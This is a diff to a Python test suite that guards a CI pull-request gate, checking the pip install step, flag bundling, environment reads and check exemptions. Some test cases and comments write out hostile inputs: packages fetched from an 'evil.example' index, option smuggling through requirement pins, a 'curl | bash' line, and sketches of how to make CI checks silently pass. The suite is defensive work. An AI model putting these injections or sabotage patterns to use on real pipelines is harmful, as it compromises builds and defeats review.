@@ -114,6 +114,38 @@ def check(label, condition, detail=""):
         print(f"  [FAIL] {label}" + (f"\n         {detail}" if detail else ""))
 
 
+def upgrade_flag(word):
+    """Does this word carry pip's upgrade flag, bundled or not?
+
+    Two readers ask this — `pip_install_ok`, deciding whether a `pip install pip` is the pinned
+    self-upgrade, and `self_upgrade`, deciding whether an install is exempt from the restated-dependency
+    rule. Both spelled it `word in ("--upgrade", "-U")`, which does not see the `U` in `-qU`. Teaching
+    the first about bundles and not the second produced exactly the half-fix this file keeps recording:
+    the bundle was accepted as a set of flags and then the command carrying it was refused, by the
+    second reader, with a message about a restated dependency. One function now, so the next bundle
+    spelling is right in both places or wrong in both.
+    """
+    return word == "--upgrade" or bool(re.fullmatch(r"-[A-Za-z]+", word) and "U" in word[1:])
+
+
+def body_of(src, marker, label):
+    """The source between `marker` and the next top-level `def`, or "" with a reported failure.
+
+    Three rules scope themselves to one function by splitting on its `def` line and taking `[1]`. That
+    index is a crash whenever the function is renamed — a legitimate refactor, since nothing pins those
+    names — and a crash here is worse than a failure: the suite's own count is an invariant ("N checks
+    ran and N were expected"), so an exception partway through discards every remaining assertion *and*
+    the invariant that would have reported their absence. A consistent rename of
+    `run_cci_reference_drift` aborted the run at 456 of 503 with no `[FAIL]` printed at all. Two earlier
+    rounds each shipped one of these; collecting the pattern in one place is the only way the next
+    caller inherits the guard instead of repeating the bug.
+    """
+    parts = src.split(marker)
+    check(f"{label} is still named {marker!r}, so the rules scoped to it still apply",
+          len(parts) > 1, f"not found — rename the marker in this file too")
+    return parts[1].split("\ndef ")[0] if len(parts) > 1 else ""
+
+
 def run_gate(*args):
     proc = subprocess.run([sys.executable, os.path.join(REPO, "scripts", "ai", "pr_gate.py"),
                            *args], cwd=REPO, capture_output=True, text=True)
@@ -286,11 +318,19 @@ check("and the whitelist refuses the no-op argv specifically, independent of the
 # — the suites read scripts/ and docs/, so coverage was satisfied, and editing thirteen suites then
 # selected nothing that ran them.
 def suites_of(check_spec):
-    """The suite paths a check runs, including the two lists resolve() splices in."""
-    if check_spec["name"] == "stdlib_offline_suites":
-        return list(pr_gate.STDLIB_SUITES)
-    if check_spec["name"] == "requests_offline_suites":
-        return list(pr_gate.REQUESTS_SUITES)
+    """The suite paths a check runs, including the lists resolve() splices in.
+
+    Read off `SPLICED_SUITES`, not matched against the two names. Round 19 made that map the single
+    mapping *inside* `pr_gate.py` and left this reader — and `check_sources` below — spelling the
+    pairing as name literals, so the derivation stopped at the file boundary. Nothing pins those names,
+    so a plain consistent rename of `requests_offline_suites` made both fall through to the `cmd` scan,
+    which returns `[]` for a bulk check (its `cmd` is `None`). Dropping that check's suite triggers then
+    went from correctly failing to 503/503 with two suites silent — the same accounting lie
+    `_claimed_suites()` was rewritten to delete, reappearing one file over.
+    """
+    spliced = pr_gate.SPLICED_SUITES.get(check_spec["name"])
+    if spliced is not None:
+        return list(spliced)
     return [a for a in (check_spec["cmd"] or ()) if a.startswith("tests/")]
 
 
@@ -2434,7 +2474,7 @@ if os.path.exists(workflow):
         i = 0
         while i < len(tail):
             word = tail[i]
-            if word in ("--upgrade", "-U"):
+            if upgrade_flag(word):
                 upgrading = True
             elif PIP_OPTS.get(word.partition("=")[0]) and "=" not in word:
                 i += 1  # skip the option's value, which is not a package
@@ -2512,10 +2552,10 @@ if os.path.exists(workflow):
         ref = re.sub(r"^refs/tags/", "", ref)
         return action, bool(sep) and repo_form and bool(REF.match(ref))
     # `python -m pip` cannot be left open the way `git fetch` can: `pip install ${reqs} evil-shim`
-    # installs whatever it is told, so the two install forms are pinned like everything else.
-    # The one payload this workflow installs, and the one it upgrades. Not spelled as whole-command
-    # literals any more: matching those as prefixes is what forced every option to the tail and let a
-    # reordered flag fall through to a laxer reader. See `pip_install_ok`.
+    # installs whatever it is told. There are no longer two pinned install *forms* — matching whole
+    # commands as prefixes is what forced every option to the tail and let a reordered flag fall
+    # through to a laxer reader — so this is just the payload the workflow installs. The self-upgrade
+    # is decided inside `pip_install_ok`, not by a constant here.
     PIP_PAYLOAD = "${reqs}"
     JOB_ASSIGN = ALLOWED_ASSIGN + (
         'reqs="$(python scripts/ai/pr_gate.py --requirements ${SEL})"',)
@@ -2559,9 +2599,12 @@ if os.path.exists(workflow):
                 return False
         if not annotation_only(seg):
             return False
-        # Fifth and last copy of this vocabulary. TEST_CMDS, not a fresh two-element tuple: this one
-        # omitted `[[` and so rejected a respelling the other four had just been taught to accept —
-        # which is what "sweep the class" means. `rg '"\["' on this file should find only TEST_CMDS.
+        # Fifth and last copy of this vocabulary. SHELL_TEST_CMDS, not a fresh two-element tuple: this
+        # one omitted `[[` and so rejected a respelling the other four had just been taught to accept —
+        # which is what "sweep the class" means. `rg '"\["' on this file finds three sites: this
+        # vocabulary and two unrelated ones (a YAML flow-style sniff, and the `[[`→`[` normalisation in
+        # `canonical_shell`). The instruction used to say it should find only one, under the constant's
+        # old name, which sent a reader to two sites they could not classify.
         if w0 in HARMLESS or w0 in TEST_CMDS:
             return True
         if w0 == "printf":
@@ -2579,15 +2622,12 @@ if os.path.exists(workflow):
         if interpreter(w0) == "python":
             if len(words) > 1 and words[1] in SCRIPTS:
                 return True
-            # Flags after the pinned form are allowed — `--quiet` on the self-upgrade cannot hide
-            # anything, since pip's exit code is unchanged, and rejecting it made this rule report a
-            # restated dependency where nothing was restated. A pinned form followed by a *package*
-            # is still refused, because only options begin with `-`.
-            # `interpreter()` normalises the *dispatch* above but the pinned forms are literals
+            # `interpreter()` normalises the *dispatch* above but the payload constant is a literal
             # beginning `python`, so `python3 -m pip install ${reqs}` — the spelling this repo's own
-            # docs use everywhere else — matched none of them and was refused as a foreign command.
-            # Third instance of the same shape: a helper that knows `python3` is `python`, and a
-            # comparison beside it that does not.
+            # docs use everywhere else — was refused as a foreign command. Third instance of the same
+            # shape: a helper that knows `python3` is `python`, and a comparison beside it that does
+            # not. (`pip_install_ok` decides the rest; the old prefix-matched `PIP_FORMS` that this
+            # comment used to describe is gone.)
             joined = strip_redir(" ".join(["python"] + words[1:]))
             return pip_install_ok(joined)
         return False
@@ -2616,9 +2656,23 @@ if os.path.exists(workflow):
         `--quiet` was allowed, which was true only in trailing position.
         """
         words = joined.split()
-        if words[:4] != ["python", "-m", "pip", "install"]:
+        # Pip takes general options before the subcommand as well as after it — `pip --quiet install X`
+        # and `pip install --quiet X` are the same command — and pinning `install` as the fourth word
+        # refused the first spelling outright. Any leading options are read by the same `pip_tail_ok`
+        # that reads the trailing ones, so moving an option across the subcommand cannot change whether
+        # it is allowed; the position was never the thing being decided.
+        head, i = words[:3], 3
+        if head != ["python", "-m", "pip"]:
             return False
-        rest, payload = words[4:], []
+        lead = []
+        while i < len(words) and words[i].startswith("-"):
+            lead.append(words[i])
+            i += 1
+        if lead and not pip_tail_ok(lead):
+            return False
+        if words[i:i + 1] != ["install"]:
+            return False
+        rest, payload = words[i + 1:], []
         i = 0
         while i < len(rest):
             word = rest[i]
@@ -2632,11 +2686,17 @@ if os.path.exists(workflow):
             if not pip_tail_ok(rest[i:i + consumed]):
                 return False
             i += consumed
-        if payload == [PIP_PAYLOAD]:
+        # `${reqs}` and `$reqs` are the same expansion in bash, so refusing one of them refused a pure
+        # respelling — the fourth time a comparison against a pinned literal has been stricter than the
+        # shell it models. The *quoted* form stays refused, and that is deliberate rather than an
+        # oversight: quoting suppresses the word-splitting this step depends on, passing the whole
+        # requirement list to pip as one argument. The failure message names it.
+        if [re.sub(r"\$\{(\w+)\}", r"$\1", p) for p in payload] == [re.sub(r"\$\{(\w+)\}", r"$\1",
+                                                                          PIP_PAYLOAD)]:
             return True
         # The self-upgrade, and it has to *be* an upgrade: a bare `pip install pip` is not the pinned
         # command, and admitting it on payload alone would be the prefix match's laxness restored.
-        return payload == ["pip"] and bool({"--upgrade", "-U"} & set(rest))
+        return payload == ["pip"] and any(upgrade_flag(w) for w in rest)
 
     def pip_tail_ok(tail):
         """Is every option in this slice one `PIP_OPTS` names, with its value if it takes one?
@@ -2657,8 +2717,20 @@ if os.path.exists(workflow):
                 return False  # a bare package name: the install is no longer the pinned one
             name, sep, glued = word.partition("=")
             if not sep and re.fullmatch(r"-[A-Za-z]", word[:2]) and len(word) > 2:
-                # `-rfile.txt` is `-r file.txt`. Only single-dash options glom.
-                name, glued, sep = word[:2], word[2:], "="
+                # `-rfile.txt` is `-r file.txt`. Only single-dash options glom — but only options that
+                # *take a value* do. Gluing unconditionally read `-qq` as `-q` with the value `q`, and
+                # since `-q` takes none, a bundle of flags pip accepts (`-qq`, `-vvv`, `-Uq`) was
+                # refused. Every letter in those bundles is separately whitelisted, so the maintainer's
+                # edit was a respelling of something already permitted — and the message sent them to
+                # `PIP_OPTS`, where adding `-qq` is the wrong fix and `-qqq` is the next report. Fifth
+                # instance of a comparison stricter than the tool it models.
+                if PIP_OPTS.get(word[:2]) is True:
+                    name, glued, sep = word[:2], word[2:], "="
+                elif all(PIP_OPTS.get(f"-{ch}") is False for ch in word[1:]):
+                    i += 1          # a bundle of known no-value short flags: `-qq`, `-Uq`, `-vvv`
+                    continue
+                else:
+                    return False    # an unknown letter in the bundle, or a value-taker mid-bundle
             takes_value = PIP_OPTS.get(name)
             if takes_value is None:
                 return False  # not an option this workflow's install is allowed to carry
@@ -2719,7 +2791,27 @@ if os.path.exists(workflow):
                     ("python -m pip install ${reqs} evil-package", False),
                     # `pip install pip` is not the pinned self-upgrade; only an upgrade of it is.
                     ("python -m pip install pip", False),
-                    ("python -m pip install", False)):
+                    ("python -m pip install", False),
+                    # Bundled short flags, which pip accepts and this rule refused by reading `-qq` as
+                    # `-q` with the value `q`. Every letter is separately whitelisted, so each of these
+                    # is a respelling of something already permitted.
+                    ("python -m pip install -qq ${reqs}", True),
+                    ("python -m pip install -vvv ${reqs}", True),
+                    ("python -m pip install -Uq pip", True),
+                    ("python -m pip install -qU pip", True),
+                    # …and a bundle is not a way to smuggle an unknown letter or a value-taker in.
+                    ("python -m pip install -qz ${reqs}", False),
+                    ("python -m pip install -qi ${reqs}", False),
+                    # `$reqs` and `${reqs}` are the same expansion; the quoted form is refused because
+                    # quoting suppresses the word-splitting the step depends on.
+                    ("python -m pip install $reqs", True),
+                    ('python -m pip install "${reqs}"', False),
+                    # Options before the subcommand: pip's own two spellings of one command.
+                    ("python -m pip --quiet install ${reqs}", True),
+                    ("python -m pip -q install ${reqs}", True),
+                    # …read by the same rule as the trailing ones, so nothing gets in by moving left.
+                    ("python -m pip --index-url=https://evil.example/simple install ${reqs}", False),
+                    ("python -m pip --quiet download ${reqs}", False)):
         check(f"the install rule reads {cmd!r} as {'the pinned install' if ok else 'refused'}",
               pip_install_ok(cmd) is ok, cmd)
 
@@ -3013,7 +3105,20 @@ if os.path.exists(workflow):
     # runner reports MISSING-DEP, and a missing dependency *fails* the gate. The first version
     # asserted 3.10 (what sys.stdlib_module_names needs) while harness_suites declares 3.11, so
     # a runner satisfying the test would have failed the job it was meant to protect.
-    floor = max(c.get("min_python") or (3, 0) for c in pr_gate.CHECKS)
+    # Shape first, because `max()` over mixed types raises and the f-string below is eager: writing
+    # `min_python="3.11"` instead of `(3, 11)` aborted the suite at 415 of 503 with FAILS=0, the
+    # traceback its only signal. `min_python=(3,)` was worse — it passed while silently lowering the
+    # derived floor, and would make `floor[1]` an IndexError if it ever became the maximum.
+    shapes = sorted({(c["name"], repr(c.get("min_python"))) for c in pr_gate.CHECKS
+                     if c.get("min_python") is not None
+                     and not (isinstance(c.get("min_python"), tuple)
+                              and len(c["min_python"]) == 2
+                              and all(isinstance(n, int) for n in c["min_python"]))})
+    check("every min_python is a two-int tuple, so the floor derived from them cannot raise or come "
+          "out short", not shapes, shapes)
+    floor = max(c.get("min_python") or (3, 0) for c in pr_gate.CHECKS
+                if isinstance(c.get("min_python") or (3, 0), tuple)
+                and len(c.get("min_python") or (3, 0)) == 2)
     # Read from the parsed document rather than off the raw text, which made an unquoted
     # `python-version: 3.13` — what a YAML formatter produces — parse as version 0.0 and blame the
     # matrix. Defaulted at every level: `gate_job` is `{}` when no single job runs the gate, and the
@@ -3175,24 +3280,48 @@ with tempfile.TemporaryDirectory() as repo:
         # is untouched. That is a strictly stronger version of the threat the pin's own comment names.
         #
         # Derived from `CHECKS` rather than spelling `tests/`: the post-filter could name any tree, and
-        # a fixture per tree someone thought of is the enumeration problem again. Every top-level
-        # directory any check triggers on gets a file, and all of them must survive the round trip.
+        # a fixture per tree someone thought of is the enumeration problem again.
         # Committed, not just written: uncommitted work reaches selection through
         # `git status --porcelain`, which is a different code path from the diff. Left untracked, the
         # probes were carried by the status path and a filter on the diff path survived this very
         # assertion — the fixture exercised the wrong half of the function it was written to cover.
-        trees = sorted({t.split("/")[0] for c in pr_gate.CHECKS for t in c["triggers"]
-                        if "/" in t and not t.startswith(".")})
-        for tree in trees:
-            os.makedirs(os.path.join(repo, tree), exist_ok=True)
-            open(os.path.join(repo, tree, "probe_reaches_selection.md"), "w").write("x\n")
+        #
+        # One probe per *trigger*, and this used to be one per top-level tree with
+        # `if "/" in t and not t.startswith(".")` — which covered 12 of the 20 roots checks trigger on,
+        # dropping every dot-tree and every top-level file. Eleven differently-keyed exclusions walked
+        # past it, including `not p.startswith(".github/")` — which stops a workflow edit from selecting
+        # the checks that guard the workflow, after which it can be edited freely. Others were keyed on
+        # a suffix (`not p.endswith(".yml")`), a basename, a regex, or an exact path, so widening the
+        # *tree* list would not have caught them either: a filter can key on anything, so the probe has
+        # to be a path the trigger really selects, extension and all.
+        probes = {}
+        for spec in pr_gate.CHECKS:
+            for trig in spec["triggers"]:
+                # A directory trigger gets a file inside it; a file trigger *is* the path, since that is
+                # the only probe a basename- or suffix-keyed filter cannot tell from the real thing.
+                probes[trig] = (trig.rstrip("/") + "/probe_reaches_selection.md"
+                                if trig.endswith("/") else trig)
+        for path in sorted(set(probes.values())):
+            os.makedirs(os.path.join(repo, os.path.dirname(path)) if os.path.dirname(path) else repo,
+                        exist_ok=True)
+            with open(os.path.join(repo, path), "w") as fh:
+                fh.write("probe\n")
         git(repo, "add", "-A")
-        git(repo, "commit", "-qm", "one file in every tree a check triggers on")
+        git(repo, "commit", "-qm", "one file for every trigger any check names")
         files = pr_gate.changed_files("base")
-        missing = [t for t in trees if f"{t}/probe_reaches_selection.md" not in files]
-        check("every tree a check triggers on survives the round trip out of changed_files, so no "
-              "post-filter can exclude one while the pinned argv stays intact",
-              not missing, f"dropped: {missing}")
+        dropped = sorted({p for p in probes.values() if p not in files})
+        check("every path a check triggers on survives the round trip out of changed_files, so no "
+              "post-filter can exclude one — whether it keys on a tree, a dot-prefix, a suffix, a "
+              "basename or an exact path — while the pinned argv stays intact",
+              not dropped, f"dropped: {dropped}")
+        # And selection has to agree: excluding a path one layer later, in `selects()`, is the same
+        # threat moved down a function.
+        unselected = sorted({(spec["name"], trig) for spec in pr_gate.CHECKS
+                             for trig in spec["triggers"]
+                             if not pr_gate.selects(spec, [probes[trig]])})
+        check("and each of those paths selects the check that names it, so the exclusion cannot move "
+              "from changed_files into selects()",
+              not unselected, unselected)
     finally:
         pr_gate.REPO_ROOT = saved_root
 
@@ -3297,10 +3426,11 @@ def check_sources(spec):
     subcommand renders — would be false positives. Those checks get the exact, data-driven
     gates below instead of a static read of the whole file.
     """
-    if spec["name"] == "stdlib_offline_suites":
-        return list(pr_gate.STDLIB_SUITES)
-    if spec["name"] == "requests_offline_suites":
-        return list(pr_gate.REQUESTS_SUITES)
+    # Off `SPLICED_SUITES`, for the reason spelled out on `suites_of` above: matching the two names
+    # here made a rename of either check silently return nothing at all.
+    spliced = pr_gate.SPLICED_SUITES.get(spec["name"])
+    if spliced is not None:
+        return list(spliced)
     if spec["cmd"] is None:
         return []
     sources = []
@@ -3442,7 +3572,7 @@ check("the drift scope names the three generated files",
 # Scoped to the function, not the file: docs/references/ is a legitimate trigger elsewhere
 # (a suite validates a shipped example under it), so a whole-file search would conflate the
 # two and pass or fail for the wrong reason.
-drift_body = src.split("def run_cci_reference_drift")[1].split("\ndef ")[0]
+drift_body = body_of(src, "def run_cci_reference_drift", "the drift check")
 drift_code = "\n".join(ln for ln in drift_body.splitlines()
                        if not ln.lstrip().startswith("#"))
 check("the drift scope no longer includes hand-authored docs/references/",
@@ -3459,6 +3589,26 @@ check("the drift scope was parsed out of the function", len(drift_scope) == 3, d
 unselecting = [g for g in drift_scope if not pr_gate.selects(drift_check, [g])]
 check("every generated file the drift check judges can select it", not unselecting,
       unselecting)
+# Everything above reads the function's *text* — which filenames it scopes to, that it goes through
+# `git()`. None of it asks whether the function can still return a failure. Adding one condition to the
+# verdict (`if drift.strip() and os.environ.get("PR_GATE_STRICT_DRIFT")`) satisfied every one of those
+# rules and made the check incapable of failing: the three filenames are present, `docs/references/` is
+# absent, `git()` is still called. Driven here instead, with the generator stubbed out and dirty status
+# injected, so the property asserted is the verdict rather than the shape of the code producing it.
+real_run, real_git = pr_gate.run, pr_gate.git
+try:
+    pr_gate.run = lambda cmd: (0, "regenerated", 0.0)
+    pr_gate.git = lambda argv, what: " M .cursor/skills/cci-orchestration/tasks-reference.md\n"
+    dirty_code, dirty_out, _ = pr_gate.run_cci_reference_drift()
+    pr_gate.git = lambda argv, what: ""
+    clean_code, _, _ = pr_gate.run_cci_reference_drift()
+finally:
+    pr_gate.run, pr_gate.git = real_run, real_git
+check("the drift check fails when the generator dirties a file it judges, so no added condition can "
+      "leave it structurally correct and permanently green",
+      dirty_code == 1 and "commit the result" in dirty_out, (dirty_code, dirty_out[-160:]))
+check("and passes when the tree comes back clean, so the rule above is not simply always-fail",
+      clean_code == 0, clean_code)
 
 print("\nA dependency-blocked advisory check does not fail the gate")
 listing = changed_list("zz_probe_path/thing.txt")
@@ -3493,6 +3643,127 @@ for name in ("cci_reference_drift", "yaml_offline_suites", *sorted(pr_gate.SPLIC
     spec = check_named(name)
     check(f"{name} resolves to a runnable callable",
           spec is not None and callable(pr_gate.resolve(spec)))
+# Callable is not enough: the map was guarded and its consumer was not. `resolve()` reads
+# `SPLICED_SUITES[name]` and builds one command per suite, so slicing that list there —
+# `[:0]` (run nothing) or `[:1]` (run one of N) — reported PASS for a check that ran no suites, while
+# `_claimed_suites()` went on claiming all of them so `unlisted_suites()` saw nothing missing. Counting
+# the commands the resolver actually produces is the property; a rule about the map cannot see it.
+for name, suites in sorted(pr_gate.SPLICED_SUITES.items()):
+    spec = check_named(name)
+    built = []
+    if spec is not None:
+        # `resolve()` closes over the list and calls `run_sequence`; intercepting that is the only way
+        # to see the argv it would run without running thirteen suites here.
+        real, pr_gate.run_sequence = pr_gate.run_sequence, lambda cmds: built.extend(cmds) or 0
+        try:
+            pr_gate.resolve(spec)()
+        finally:
+            pr_gate.run_sequence = real
+    check(f"{name} resolves to a command for every one of its {len(suites)} suites, so the resolver "
+          "cannot run a slice of them while the claim still covers all",
+          [c[-1] for c in built] == list(suites), built)
+
+# Every rule in this file runs the gate *locally*. That is the one structural blind spot a local guard
+# suite has, and it is wide enough to drive through: a predicate keyed on the environment behaves one
+# way here and another way in Actions, so the suite can be green about code that never does in CI what
+# it does on a laptop. Three separate one-liners exploited it — `if code and os.environ["RUNNER_OS"]:
+# code = 0` (zeroes every verdict, since Actions always sets it), and `changed_files()` returning `[]`
+# under `GITHUB_ACTIONS` or `CI` (selects nothing, prints "All selected gating checks passed"). All
+# three passed 503/503, and no fixture could have caught them, because the fixture is the laptop.
+#
+# So the property is not "these particular variables are not read" — enumerating the runner's variables
+# is the losing game — it is that the gate's behaviour does not depend on the environment at all.
+# `FOUNDATIONS_REPO_ROOT` is the one exception, and it is read by a *check*, not by the gate.
+gate_src = pathlib.Path(pr_gate.__file__).read_text()
+
+# The guard suite reads the workflow's `python -m pip install ${reqs}` and pins every word of it. But
+# `${reqs}` is the *stdout of this script*, interpolated unquoted under `set -f` precisely so it
+# word-splits — so every token the generator emits becomes its own pip argv word, and none of the
+# payload rules ever looked at it. One token added to `CO_REQUIRES` or `PINS`:
+#
+#     CO_REQUIRES = {"cumulusci": ["--index-url=https://evil.example/simple", "setuptools>=…"]}
+#     PINS = {"cumulusci": "cumulusci==4.8.1 --extra-index-url https://evil.example/simple"}
+#
+# and pip installs from an arbitrary index, in CI, before any check runs — while the workflow text is
+# untouched and the suite reports 503/503. It is the same hole round 19 closed on the YAML side,
+# reached through the generator instead, which is the general lesson: pinning the consumer of a
+# generated value proves nothing about the value.
+#
+# Requirement specifiers only: a leading `-` is an option, whitespace inside a token is a second
+# argument smuggled through one dict value, and a URL is an index or a direct reference. PEP 508 allows
+# far more than this repo needs; the point is not to parse it but to refuse anything that is not a
+# name, an extra, and a version constraint.
+emitted = [ln for ln in run_gate("--requirements", "--all")[1].splitlines() if ln.strip()]
+check("the generated install payload is non-empty, so the rules below are not vacuous",
+      len(emitted) >= 5, emitted)
+bad_tokens = [tok for tok in emitted
+              if not re.fullmatch(r"[A-Za-z][A-Za-z0-9._-]*(\[[A-Za-z0-9,._-]+\])?"
+                                  r"((==|>=|<=|~=|!=|<|>)[A-Za-z0-9.*+!-]+(,\s*)?)*", tok.strip())
+              or tok != tok.strip() or " " in tok.strip()]
+check("every token it emits is a bare requirement specifier — no option, no URL, no second argument "
+      "smuggled inside one PINS/CO_REQUIRES value, because each token becomes its own pip argv word",
+      not bad_tokens, bad_tokens)
+check("and no emitted token can re-point pip at another index or a local path",
+      not [t for t in emitted if "://" in t or t.strip().startswith(("-", ".", "/", "@"))], emitted)
+
+ENV_READS_OK = set()
+# `os.environ`/`os.getenv` specifically, not the word "environment" — the first spelling of this rule
+# matched a comment about an environment *failure* and reported the gate as reading a variable called
+# "interpreter reports as exit 1…". A rule that fires on prose is a rule someone deletes.
+env_lines = sorted({ln.strip() for ln in gate_src.splitlines()
+                    if re.search(r"os\.(environ|getenv)\b", ln)})
+env_names = {n for ln in env_lines for n in re.findall(r"""["']([A-Za-z_][A-Za-z0-9_]*)["']""", ln)}
+check("the gate reads no environment variable, so it cannot behave one way locally and another in "
+      "Actions — the blind spot every rule in this file shares (add a name to ENV_READS_OK only with "
+      "a reason a CI-only behaviour change is acceptable)",
+      not env_lines or (env_names and not (env_names - ENV_READS_OK)), env_lines)
+
+# The other way a verdict disappears between producing it and reporting it: exempt one check by name.
+# `if check["name"] != "pr_gate_suite": failures.append(...)` still prints `[FAIL] pr_gate_suite` — the
+# log looks correct — but `main()` returns non-zero only from `failures`, so a PR whose one red check is
+# this suite exits 0, and every guard in this file becomes unenforceable at once. The argv spelling
+# (`if any(a.endswith("tests/test_pr_gate.py") for a in argv): code = 0` inside `run()`) is the same
+# move keyed on a path instead of a name. Both are refused by the same property: the machinery that
+# runs a check and books its result must not mention any individual check.
+# Scoped to `run()` and the booking loop, and *not* to `resolve()` between them, which names two
+# checks legitimately (they are the ones whose argv it builds). The first version of this rule swept
+# from `def run(` to `def main(`, caught `resolve()`, and reported those two as violations — a rule
+# whose region is wrong accuses correct code, which is how it gets deleted rather than narrowed.
+plumbing = (body_of(gate_src, "def run(", "the command runner")
+            + body_of(gate_src, "def run_sequence(", "the sequence runner")
+            + gate_src.split("results, failures, advisory_failures")[-1].split("width = max(")[0])
+named_in_plumbing = sorted({n for n in names if f'"{n}"' in plumbing or f"'{n}'" in plumbing})
+check("no check is named inside run(), run_sequence() or the booking loop, so no single check's "
+      "failure can be booked differently from the rest",
+      not named_in_plumbing, named_in_plumbing)
+suite_paths = sorted({s for c in pr_gate.CHECKS for s in suites_of(c)})
+pathed_in_plumbing = sorted({s for s in suite_paths if s in plumbing})
+check("and no suite path is named there either, which is the same exemption keyed on argv rather "
+      "than on the check's name",
+      not pathed_in_plumbing, pathed_in_plumbing)
+# Behavioural, because a rule about source text is only as good as the region it reads: a *failing*
+# gating check has to reach the FAILED line and a non-zero exit, whatever its name. Driven in-process
+# over a one-check `CHECKS`, and deliberately not by shelling out with a real selector — the first
+# version of this rule wrote a probe suite into `tests/`, which selection then saw as an untracked
+# change to `tests/`, which selected this very suite, which ran it again. The recursion took five
+# minutes to notice and is a good argument for keeping fixtures out of paths the gate watches.
+probe_fail = dict(name="zz_probe_gating_failure", cmd=["python", "-c", "import sys; sys.exit(1)"],
+                  triggers=["tests/"], deps=[], gating=True, note="probe")
+real_checks, real_changed, real_argv = pr_gate.CHECKS, pr_gate.changed_files, sys.argv
+buf = io.StringIO()
+try:
+    pr_gate.CHECKS = [probe_fail]
+    pr_gate.changed_files = lambda base: ["tests/probe.py"]
+    sys.argv = ["pr_gate.py", "--base", "HEAD"]
+    with redirect_stdout(buf):
+        rc = pr_gate.main()
+finally:
+    pr_gate.CHECKS, pr_gate.changed_files, sys.argv = real_checks, real_changed, real_argv
+printed = buf.getvalue()
+check("a failing gating check reaches the FAILED line and a non-zero exit, so a verdict cannot be "
+      "printed and then dropped from the accounting",
+      rc == 1 and "zz_probe_gating_failure" in printed.split("FAILED:")[-1],
+      (rc, printed[-300:]))
 
 print("\nCommand-line contract")
 code, out = run_gate("--list")
@@ -3582,15 +3853,23 @@ try:
     check("skipped checks say why they were skipped", "nothing it covers changed" in out)
     # Every check lands in exactly one bucket and the buckets sum to the total, so a reader
     # reconciling them never finds one unaccounted for.
+    # The failure count is deliberately *not* in this pattern. It is not a bucket — it overlaps all
+    # three and can also hold `unlisted_suites`, which is not a check — and pinning it here is what let
+    # the wording drift into "0 blocked on a missing dependency, of which 1 failed": the regex was
+    # updated to match the new phrasing, so the suite green-lit a sentence that contradicts itself.
+    # Matching only the three that partition keeps this rule about the arithmetic it can actually check.
     buckets = re.search(r"(\d+) checks: (\d+) executed, (\d+) skipped, "
-                        r"(\d+) blocked on a missing dependency, of which (\d+) failed", out)
+                        r"(\d+) blocked on a missing dependency\.", out)
     check("the summary reports every bucket separately", buckets is not None, out[-300:])
-    # Groups 2-4 only. `failed` overlaps them rather than partitioning with them, and the summary now
-    # says "of which" so that a reader does not add all four and find one check too many.
     check("the buckets account for every check",
           buckets and int(buckets.group(1)) == sum(int(buckets.group(i))
                                                   for i in (2, 3, 4)),
           buckets.groups() if buckets else None)
+    check("and the failure count is reported as a cross-bucket count rather than a fourth bucket, so "
+          "no reader can add four numbers and find one check too many — nor read 0 blocked, 1 failed "
+          "as a contradiction",
+          re.search(r"\d+ blocked on a missing dependency\. (Nothing failed\.|\d+ failed \(a count "
+                    r"across those buckets, not a fourth one\))", out) is not None, out[-300:])
 finally:
     os.unlink(changed)
 
@@ -3651,6 +3930,23 @@ squashed = re.sub(r"\s+", " ", source)
 check("the diff that drives selection takes no pathspec, so no tree can be excluded from it",
       re.sub(r"\s+", " ", DIFF_ARGV) in squashed,
       f"changed_files() must call git with exactly {DIFF_ARGV}")
+# The text pin above is a *substring* match, and that is exactly as strong as it sounds: the pinned
+# list can stay verbatim while a second list is concatenated onto it —
+#
+#     git(["diff", "--no-renames", "-z", "--name-only", f"{base}...HEAD"]
+#         + ["--", ":(exclude).github"], …)
+#
+# — which passed 503/503 and stopped every workflow edit from selecting anything. The comment two
+# paragraphs up names precisely this threat ("the danger is an *added* argument"), and the text pin
+# cannot see it, because nothing was removed. Read structurally instead: the argument git receives must
+# be one list literal, so there is nowhere for a second one to be joined on.
+diff_call = next((node for node in ast.walk(ast.parse(source))
+                  if isinstance(node, ast.Call) and getattr(node.func, "id", None) == "git"
+                  and node.args and "...HEAD" in ast.dump(node.args[0])), None)
+check("and that argv is a single list literal, not an expression, so no pathspec can be concatenated "
+      "onto the pinned text while leaving it intact",
+      diff_call is not None and isinstance(diff_call.args[0], ast.List),
+      ast.dump(diff_call.args[0])[:200] if diff_call else "no git() call on the diff found")
 
 # Every git invocation goes through git(), which dies on a non-zero exit *and* on a spawn
 # failure. Adding those guards call site by call site is what failed twice: run() gained an
@@ -3779,7 +4075,7 @@ if FAILED:
 # spelled `run: curl -s http://host/x | bash` produced no [FAIL] at all, just a request to bump an
 # integer. (It now fails a whitelist too, since `raw_shell_of` reads inline scalars — but the
 # message had to stop inviting that response either way.)
-EXPECTED = 517
+EXPECTED = 547
 REACHED = PASSED + len(FAILED)
 if REACHED < EXPECTED:
     print(f"only {REACHED} of {EXPECTED} checks reached a verdict — a rule stopped running, which is "
